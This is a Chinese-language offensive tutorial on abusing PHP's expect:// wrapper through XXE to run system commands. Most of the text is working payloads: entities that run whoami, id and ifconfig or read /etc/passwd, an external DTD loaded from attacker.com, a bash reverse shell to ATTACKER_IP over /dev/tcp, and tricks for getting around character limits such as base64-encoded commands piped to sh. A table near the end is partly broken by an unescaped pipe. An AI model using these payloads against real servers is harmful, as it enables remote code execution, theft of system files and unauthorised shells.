## `expect://` 协议详解

### 1. **什么是 `expect://`？**
`expect://` 是PHP的一个包装器（wrapper），它允许**执行系统命令**并通过标准I/O与进程交互。这可以说是XXE攻击中最危险的协议之一。
### 2. **使用前提**
**必须满足以下条件：**
- PHP环境
- 已安装并启用 `expect` 扩展
- 通常需要：`php-expect` 包已安装
检查是否可用：
`php -m | grep expect`
### 3. **基本语法**
```php
expect://command
```
### 4. **在XXE中的利用**
#### 读取系统命令执行结果：
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY cmd SYSTEM "expect://whoami">
]>
<data>&cmd;</data>
```
#### 执行复杂命令：
```xml
<!ENTITY cmd SYSTEM "expect://ls -la /">
<!ENTITY cmd SYSTEM "expect://cat /etc/passwd">
<!ENTITY cmd SYSTEM "expect://id">
```
### 5. **实际攻击示例**
#### 示例1：获取当前用户
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&result;</root>
```
在 `evil.dtd` 中：
```xml
<!ENTITY % cmd "whoami">
<!ENTITY % execute "<!ENTITY result SYSTEM 'expect://%cmd;'>">
%execute;
```
#### 示例2：执行反向Shell
```xml
<!ENTITY shell SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'">
```
#### 示例3：读取文件内容
```xml
<!ENTITY file SYSTEM "expect://cat /etc/passwd">
```
### 6. **命令执行与回显**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY hostname SYSTEM "expect://hostname">
<!ENTITY users SYSTEM "expect://who">
<!ENTITY network SYSTEM "expect://ifconfig">
]>
<data>
    <host>&hostname;</host>
    <users>&users;</users>
    <network>&network;</network>
</data>
```
### 7. **检测 expect 是否可用**
在XXE探测中，可以这样检测：
```xml
<!ENTITY test SYSTEM "expect://echo XXE_TEST">
```

## `expect://` 协议中的==可能==的特殊字符限制

### 1. **命令分隔符**（需要转义）
```bash
;  &&  ||  |  &
```
### 2. **重定向符号**（需要转义）
```
>  <  2>&1 
```
### 3. **空格和引号等**（需要处理）
```
"  '  ` 空格  : () {}
```
### 4. **变量和通配符**
```
$ *  ?  
```

## 安全执行复杂命令的方法
### 方法1：使用 `sh -c` 包装
```xml
<!ENTITY cmd SYSTEM "expect://sh -c 'ls -la | grep test && echo done'">
```
### 方法2：Base64编码命令
```xml
<!ENTITY cmd SYSTEM "expect://echo 'bHMgLWxhIHwgZ3JlcCB0ZXN0' | base64 -d | sh">
```
### 方法3：使用临时脚本
```xml
<!ENTITY cmd SYSTEM "expect://echo 'ls -la' > /tmp/cmd.sh && bash /tmp/cmd.sh">
```
## 具体问题字符及解决方案
### 问题字符列表：

| 字符      | 问题   | 解决方案         |              |
| ------- | ---- | ------------ | ------------ |
| `;`     | 命令分隔 | 用 `sh -c` 包装 |              |
| `&`     | 后台执行 | 用引号包裹        |              |
| `       | `    | 管道           | 用 `sh -c` 包装 |
| `>` `<` | 重定向  | 用 `sh -c` 包装 |              |
| `"` `'` | 引号   | 正确转义         |              |
| `$`     | 变量扩展 | 使用 `\$` 转义   |              |
| `*` `?` | 通配符  | 通常可以正常工作     |              |
| 空格      | 参数分隔 | 使用引号包裹路径     |              |
